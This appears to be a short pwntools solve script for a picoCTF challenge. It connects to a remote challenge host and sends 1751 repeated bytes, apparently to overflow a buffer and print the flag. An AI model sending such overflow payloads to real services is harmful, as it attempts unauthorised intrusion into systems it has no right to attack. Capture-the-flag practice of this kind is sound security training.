from pwn import *

# for a remote instance
io = remote('foggy-cliff.picoctf.net', 61974)

io.sendline(b'\x65' * 1751)
print(io.recvall().decode())